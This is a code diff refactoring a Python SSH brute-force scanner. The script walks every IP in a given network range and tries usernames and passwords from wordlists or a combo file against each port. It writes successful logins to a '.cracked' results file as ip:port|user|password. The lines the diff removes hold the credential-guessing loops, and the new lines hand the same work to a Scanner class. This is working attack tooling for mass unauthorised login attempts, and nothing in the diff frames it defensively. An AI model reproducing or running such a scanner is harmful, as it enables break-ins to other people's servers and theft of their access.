@@ -3,10 +3,10 @@
 import sys
 from ipaddress import ip_network
 
+from scanner import Scanner
 import helper
 from constants import cx_status
 
-_9hits_sep = '|'
 timeout = 10
 verbose = True
 in_file = None
@@ -18,62 +18,6 @@ def get_ip(cidr):
     net = ip_network(cidr, strict=False)
     for ip in net:
         yield str(ip)
-
-
-def store_open_ip_port(ip, port, open_ports):
-    ip_port = f"{ip}:{port}"
-    if ip_port not in open_ports:
-        open_ports.append(ip_port)
-        with open(f"{out_file}.open", "a") as opf:
-            opf.write(f"{ip_port}\n")
-
-
-def treat_ip(ip, ports, of):
-    if verbose:
-        print(f"IP: {ip}")
-    for port in ports:
-        treat_port(ip, port, of)
-
-
-def treat_port(ip, port, of):
-    open_ports = []
-    if verbose:
-        print(f"port {port}")
-    if in_file:
-        with open(in_file, 'r') as f:
-            for line in f:
-                x = line.split('|')
-                user, password = x[0], x[1].strip()
-                status = connect_user_password(ip, port, user, password, of)
-                if status in (cx_status.CONNECTED, cx_status.NOT_LISTENING):
-                    return status
-                else:
-                    store_open_ip_port(ip, port, open_ports)
-    else:
-        with open(u_file, 'r') as uf:
-            with open(p_file, 'r') as pf:
-                for user in uf:
-                    for password in pf:
-                        status = connect_user_password(ip, port, user.strip(), password.strip(), of)
-                        if status in (cx_status.CONNECTED, cx_status.NOT_LISTENING):
-                            return status
-                        else:
-                            store_open_ip_port(ip, port, open_ports)
-
-
-def connect_user_password(ip, port, user, password, of):
-    ret = helper.try_login(ip, port, user, password, verbose, timeout)
-    if ret == cx_status.CONNECTED:
-        if verbose:
-            print(f"{user}:{password}@{ip}:{port} OK")
-        of.write(f"{ip}:{port}{_9hits_sep}{user}{_9hits_sep}{password}\n")
-    elif ret == cx_status.NOT_LISTENING:
-        if verbose:
-            print(f"Nothing is listening on port {port}")
-    else:
-        if verbose:
-            print(f"{user}:{password}@{ip}:{port} ko")
-    return ret
 
 
 out_file = '/tmp/ssh_scan_results.txt'
@@ -119,4 +63,5 @@ if not (in_file or (u_file and p_file)):
 
 with open(f"{out_file}.cracked", 'a') as of:
     for ip in get_ip(ip_range):
-        treat_ip(ip, ports, of)
+        scanner = Scanner(ip, ports, u_file, p_file, in_file, verbose, timeout, of)
+        scanner.scan_ip()
